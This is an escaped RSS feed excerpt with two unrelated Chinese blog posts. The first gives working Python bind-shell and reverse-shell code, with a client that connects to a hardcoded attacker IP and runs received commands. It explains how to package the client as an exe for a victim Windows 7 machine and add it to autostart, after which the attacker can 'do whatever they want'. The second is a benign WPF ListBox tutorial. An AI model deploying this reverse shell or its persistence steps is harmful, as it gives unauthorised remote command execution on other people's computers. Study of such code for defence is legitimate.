&lt;p&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;span&gt;反弹shell的好处就是:一旦被攻击端开机,立即连接上攻击端(需要攻击端一直运行)&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;shell:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;客户端：&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;　&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
s&lt;/span&gt;=&lt;span&gt;socket.socket()
s.connect((&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;192.168.0.114&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,1234))   &lt;span&gt;#&lt;/span&gt;&lt;span&gt;连接的服务器的ip地址,端口&lt;/span&gt;
&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; range(10&lt;span&gt;):
    com&lt;/span&gt;=input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;command:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    s.send(com.encode())     &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;发送信息&lt;/span&gt;
    d=s.recv(1024)           &lt;span&gt;#&lt;/span&gt;&lt;span&gt;接受数据的大小&lt;/span&gt;
    &lt;span&gt;print&lt;/span&gt;(d.decode(),len(d))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;服务端:　&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;服务器端&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; os
s&lt;/span&gt;=socket.socket()   &lt;span&gt;#&lt;/span&gt;&lt;span&gt;创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&lt;/span&gt;
&lt;span&gt;
s.bind((&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;0.0.0.0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,1234))    &lt;span&gt;#&lt;/span&gt;&lt;span&gt;绑定地址和端口#0.0.0.0接收任意客户端ip连接&lt;/span&gt;
s.listen(5)                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt;调用listen方法开始监听端口，传入的参数为等待连接的最大数量&lt;/span&gt;
con,addr=s.accept()     &lt;span&gt;#&lt;/span&gt;&lt;span&gt;接受一个客户端的连接&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;print(con,addr)&lt;/span&gt;

&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; range(10&lt;span&gt;):
    cmd&lt;/span&gt;=con.recv(1024&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(cmd)
    command&lt;/span&gt;=&lt;span&gt;cmd.decode()
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; command.startswith(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;cd&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;):
        os.chdir(command[&lt;/span&gt;2:].strip())   &lt;span&gt;#&lt;/span&gt;&lt;span&gt;切换路径&lt;/span&gt;
        result=os.getcwd()      &lt;span&gt;#&lt;/span&gt;&lt;span&gt;显示路径&lt;/span&gt;
    &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        result&lt;/span&gt;=&lt;span&gt;os.popen(command).read()
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; result:
        con.send(result.encode())
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        con.send(b&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OK!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;测试:（客户端(win10)、服务端(win7)）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.把服务端打包成exe文件,然后在win7运行打包好的exe文件，python打包成exe文件这里推荐pyinstaller模块(需要安装,安装方法不会的百度)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;打包成exe文件时最好打包成文件夹，如何打包成单个exe文件,在win7中运行可能会出题。下图就是打包的文件夹,双击运行图中exe文件&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201903/1592114-20190304210919461-1034610988.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.在win10运行客户端&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201903/1592114-20190304215457154-1547127468.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;反弹shell：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;客户端:&lt;/span&gt;　&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;反弹shell,攻击端是服务端,被攻击端是客户端&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;正常shell,攻击端是客户端,被攻击端是服务端&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;例:攻击端(win10),被攻击端(win7),正常shell,先在win7启动服务端,再在win10启用客户端&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;   反弹shell,先在win10启用服务端,再在win7启用客户端&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;   反弹shell的好处就是:一旦被攻击端开机,立即连接上攻击端(需要攻击端一直运行)&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;   正常shell需要先在攻击端开机情况下开启程序,然后攻击端运行程序,才能连接    &lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; os
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; sys
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;print(sys.argv)&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;hacker=sys.argv[1]&lt;/span&gt;
hacker=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;192.168.0.144&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
port&lt;/span&gt;=1234&lt;span&gt;
server&lt;/span&gt;=&lt;span&gt;(hacker,port)
s&lt;/span&gt;=&lt;span&gt;socket.socket()
s.connect(server)

&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; 1&lt;span&gt;:
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 得到被攻击端的所在目录，并发送&lt;/span&gt;
    dir=&lt;span&gt;os.getcwd()
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;print(dir)&lt;/span&gt;
&lt;span&gt;    s.send(dir.encode())
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 接收来自攻击端(服务器端)的命令，并进行处理&lt;/span&gt;
    cmd=s.recv(1024&lt;span&gt;).decode()
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 对接收的命令做出判断&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 退出&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; cmd==&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;
    &lt;span&gt;elif&lt;/span&gt; cmd.startswith(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;cd&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;):
        os.chdir(cmd[&lt;/span&gt;2&lt;span&gt;:].strip())
        result&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;切换目录成功!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
    &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        result&lt;/span&gt;=&lt;span&gt;os.popen(cmd).read()
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; result:
        result&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;命令执行完毕!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    
    s.send(result.encode())
    time.sleep(&lt;/span&gt;1&lt;span&gt;)
    
s.close()
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;退出!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)    
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;服务端:&lt;/span&gt;　&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
server&lt;/span&gt;=(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;0.0.0.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,1234&lt;span&gt;)
s&lt;/span&gt;=&lt;span&gt;socket.socket()
s.bind(server)
s.listen(&lt;/span&gt;5&lt;span&gt;)
con,addr&lt;/span&gt;=&lt;span&gt;s.accept()
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(addr,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;已经接入!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; 1&lt;span&gt;:
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;接收来自被攻击端的所在目录&lt;/span&gt;
    dir=con.recv(1024&lt;span&gt;).decode()
    cmd&lt;/span&gt;=input(dir+&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).strip()
    con.send(cmd.encode())
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; cmd==&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;
    result&lt;/span&gt;=con.recv(65365&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(result.decode())
    time.sleep(&lt;/span&gt;1&lt;span&gt;)
s.close()
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;退出!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)    
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;测试:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.先在win10运行反弹shell服务端&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.再把反弹shell客户端打包成exe文件夹,复制到win7中，然后双击运行&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.这时可以看到服务端(win10)已经和客户端(win7)连接上了。#只要服务端一直运行，如果把客户端的程序加入到开机自启,这样客户端已开启就被连接到服务端　&lt;/span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201903/1592114-20190304214803343-699573742.jpg&quot; alt=&quot;&quot;/&gt;&lt;span&gt;&lt;span&gt;　&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 4.接下就可以为所欲为了　&lt;/span&gt;　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201903/1592114-20190304215545134-1256220357.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 04 Mar 2019 13:58:00 +0000</pubDate>
<dc:creator>雨中落叶</dc:creator>
<og:description>python shell与反弹shell 正常shell需要先在攻击端开机情况下开启程序,然后攻击端运行程序,才能连接 反弹shell,攻击端是服务端,被攻击端是客户端正常shell,攻击端是客户端,</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yuzly/p/10473497.html</dc:identifier>
</item>
<item>
<title>WPF开发为按钮提供添加，删除和重新排列ListBox内容的功能 - 九天飞翼</title>
<link>http://www.cnblogs.com/langda/p/10473467.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/langda/p/10473467.html</guid>
<description>&lt;h2&gt;&lt;span&gt;介绍&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;我有一种情况，我希望能够将项目添加到列表中，并在列表中移动项目，这似乎是使用a的最简单方法&lt;/span&gt;&lt;code&gt;ListBox&lt;/code&gt;&lt;span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;我立刻想到了如何以通用的方式做到这一点，然后，也许，可以使用&lt;/span&gt;&lt;/span&gt;&lt;strong&gt;行为&lt;/strong&gt;&lt;span&gt;&lt;span&gt;来做到这一点。&lt;/span&gt;&lt;span&gt;这似乎是一个非常有用的想法。&lt;/span&gt;&lt;span&gt;我决定以一种简单的方式为我正在开发的应用程序做这件事，但我想我会创建一个演示项目来探索这个想法。&lt;/span&gt;&lt;span&gt;这是结果。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;概观&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;该行为实际上有四个独立的部分，可以在一个类中执行不同的功能：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;添加项目&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;将所选项目向上移动一个位置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;将所选项目向下移动一个位置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;删除所选项目。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;每个函数的代码结构非常相似，只有一些细节不同。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;将要检查的代码是&lt;/span&gt;&lt;strong&gt;Move Up&lt;/strong&gt;&lt;span&gt;&lt;span&gt;函数&lt;/span&gt;&lt;span&gt;的代码&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;首先是以下定义&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide657447&quot;&gt;隐藏   &lt;span id=&quot;copycode657447&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;public &lt;span class=&quot;code-keyword&quot;&gt;static readonly DependencyProperty MoveItemUpProperty =
    DependencyProperty.RegisterAttached(&lt;span class=&quot;code-string&quot;&gt;&quot;&lt;span class=&quot;code-string&quot;&gt;MoveItemUp&quot;,
        &lt;span class=&quot;code-keyword&quot;&gt;typeof(Selector), &lt;span class=&quot;code-keyword&quot;&gt;typeof(ListHelperBehavior),
            &lt;span class=&quot;code-keyword&quot;&gt;new PropertyMetadata(&lt;span class=&quot;code-keyword&quot;&gt;null, OnMoveItemUpChanged));

&lt;span class=&quot;code-keyword&quot;&gt;public &lt;span class=&quot;code-keyword&quot;&gt;static Selector GetMoveItemUp(UIElement uiElement)
{ &lt;span class=&quot;code-keyword&quot;&gt;return (Selector)uiElement.GetValue(MoveItemUpProperty); }

&lt;span class=&quot;code-keyword&quot;&gt;public &lt;span class=&quot;code-keyword&quot;&gt;static &lt;span class=&quot;code-keyword&quot;&gt;void SetMoveItemUp(UIElement uiElement, Selector value)
{ uiElement.SetValue(MoveItemUpProperty, value); }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;这用于为&lt;/span&gt;&lt;span&gt;包含列表&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;（或&lt;/span&gt;&lt;code&gt;ListBox&lt;/code&gt;&lt;span&gt;&lt;span&gt;）控件&lt;/span&gt;&lt;span&gt;提供绑定&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;它用于&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;&lt;span&gt;执行动作，在这种情况下是将所选项目向上移动一个位置。&lt;/span&gt;&lt;span&gt;对于这个动作的代码需要有机会获得&lt;/span&gt;&lt;/span&gt;&lt;code&gt;ItemsSource&lt;/code&gt;&lt;span&gt;和&lt;/span&gt;&lt;code&gt;SelectedIndex&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;控制，首先要真正能够做到移动，第二知道要移动的项目。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;对于所有操作，此代码几乎相同，只是&lt;/span&gt;&lt;strong&gt;Add Item&lt;/strong&gt;&lt;span&gt;不需要监视&lt;/span&gt;&lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;事件&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;，并且&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;永远不会禁用。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;当此&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;更改时，将&lt;/span&gt;&lt;code&gt;OnMoveUpItemChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;执行&lt;/span&gt;&lt;span&gt;事件处理程序&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;此事件处理程序在&lt;/span&gt;&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;&lt;span&gt;RegisterAttached方法&lt;/span&gt;&lt;span&gt;的FrameworkMetadata参数中指定&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide84243&quot;&gt;隐藏   &lt;span id=&quot;copycode84243&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private &lt;span class=&quot;code-keyword&quot;&gt;static &lt;span class=&quot;code-keyword&quot;&gt;void OnMoveItemUpChanged(DependencyObject d,
    DependencyPropertyChangedEventArgs e)
{
    &lt;span class=&quot;code-keyword&quot;&gt;if (e.OldValue is Selector Selector1)
    {
        Selector1.SelectionChanged -= SetMoveItemUpButtonIsEnabled;
    }
    &lt;span class=&quot;code-keyword&quot;&gt;if (e.NewValue is Selector Selector)
    {
        &lt;span class=&quot;code-keyword&quot;&gt;var Button = CheckForButtonBase(d);
        Button.Click -= MoveItemUpEvent;
        Button.Click += MoveItemUpEvent;
        Selector.SetValue(MoveUpButton, Button);
        Selector.SelectionChanged += SetMoveItemUpButtonIsEnabled;
        SetMoveItemUpButtonIsEnabled(Selector, &lt;span class=&quot;code-keyword&quot;&gt;null);
    }
}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;此代码将事件处理程序附加到&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;Click事件和&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt; &lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;事件。&lt;/span&gt;&lt;span&gt;为了确保&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;&lt;span&gt;在订阅事件之前没有双重订阅Click事件&lt;/span&gt;&lt;span&gt;，并且删除&lt;/span&gt;&lt;/span&gt;&lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;旧&lt;/span&gt;&lt;span&gt;事件的事件处理程序&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;（如果存在）。&lt;/span&gt;&lt;span&gt;此外，&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;它保存在附件&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;中，&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;以便可以找到它以供&lt;/span&gt;&lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;事件处理程序&lt;/span&gt;&lt;span&gt;使用&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;最后，&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;通过使用&lt;/span&gt;&lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;事件处理程序&lt;/span&gt;&lt;span&gt;调整IsEnabled值&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;为的保存代码&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;在&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;被下面的私人&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;从而使&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;被启用和禁用，可以发现：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide747570&quot;&gt;隐藏   &lt;span id=&quot;copycode747570&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private &lt;span class=&quot;code-keyword&quot;&gt;static readonly DependencyProperty MoveUpButton =
    DependencyProperty.RegisterAttached(&lt;span class=&quot;code-string&quot;&gt;&quot;&lt;span class=&quot;code-string&quot;&gt;MoveUpButton&quot;,
        &lt;span class=&quot;code-keyword&quot;&gt;typeof(ButtonBase), &lt;span class=&quot;code-keyword&quot;&gt;typeof(ListHelperBehavior),
            &lt;span class=&quot;code-keyword&quot;&gt;new PropertyMetadata(&lt;span class=&quot;code-keyword&quot;&gt;null));
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;Add Item代码不需要监视SelectionChanged事件，因为&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;从不禁用它。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;的Click事件&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;strong&gt;下移&lt;/strong&gt;&lt;span&gt;功能如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide813057&quot;&gt;隐藏   &lt;span id=&quot;copycode813057&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private &lt;span class=&quot;code-keyword&quot;&gt;static &lt;span class=&quot;code-keyword&quot;&gt;void MoveItemUpEvent(object sender, RoutedEventArgs e)
{
    Debug.Assert(sender is ButtonBase);
    &lt;span class=&quot;code-keyword&quot;&gt;var Button = (ButtonBase)sender;
    &lt;span class=&quot;code-keyword&quot;&gt;var Selector = GetMoveItemUp(Button);
    &lt;span class=&quot;code-keyword&quot;&gt;var IList = CheckForIList(Selector);
    &lt;span class=&quot;code-keyword&quot;&gt;var itemNumber = Selector.SelectedIndex;
    &lt;span class=&quot;code-keyword&quot;&gt;var item = IList[itemNumber];
    IList.RemoveAt(itemNumber);
    &lt;span class=&quot;code-keyword&quot;&gt;var type = IList.GetType().GetGenericArguments().Single();
    &lt;span class=&quot;code-keyword&quot;&gt;var castInstance = Convert.ChangeType(item, type);
    IList.Insert(itemNumber - &lt;span class=&quot;code-digit&quot;&gt;1, castInstance);
    &lt;span class=&quot;code-keyword&quot;&gt;if (itemNumber == &lt;span class=&quot;code-digit&quot;&gt;1) Button.IsEnabled = &lt;span class=&quot;code-keyword&quot;&gt;false;
    Selector.SelectedIndex = itemNumber - &lt;span class=&quot;code-digit&quot;&gt;1;
}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;sender参数必须强制转换为ButtonBase类型，然后用于获取&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;作为ButtonBase中附加属性保存&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;控件&lt;/span&gt;&lt;span&gt;的值&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;然后使用它来获取&lt;/span&gt;&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;绑定到&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt; &lt;code&gt;ItemsSource&lt;/code&gt; &lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;code&gt;SelectedItem&lt;/code&gt;&lt;span&gt;&lt;span&gt;值&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;值&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;。&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;&lt;span&gt;然后复制&lt;/span&gt;&lt;span&gt;所选项目&lt;/span&gt;&lt;span&gt;，转换为正确的类型（使用Type类的Reflection GetGenericArgument方法获取类型，然后使用Convert.ChangeType方法将其强制转换），然后从&lt;/span&gt;&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;&lt;span&gt;（RemoveAt方法）中&lt;/span&gt;&lt;span&gt;删除&lt;/span&gt;&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;&lt;span&gt;）。&lt;/span&gt;&lt;span&gt;然后使用该&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt; &lt;code&gt;Insert&lt;/code&gt;&lt;span&gt;&lt;span&gt;方法&lt;/span&gt;&lt;span&gt;插入删除的项目&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;接下来检查是否现在是第一个项目，禁用&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;它是否为，并且&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt; &lt;code&gt;SelectedIndex&lt;/code&gt;&lt;span&gt;设置为仍然指向同一个项目。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;该&lt;/span&gt;&lt;strong&gt;移&lt;/strong&gt;&lt;span&gt;码几乎是相同的，则&lt;/span&gt;&lt;strong&gt;删除&lt;/strong&gt;&lt;span&gt;要简单得多，因为它没有保存已删除的项目，然后将其放回&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;
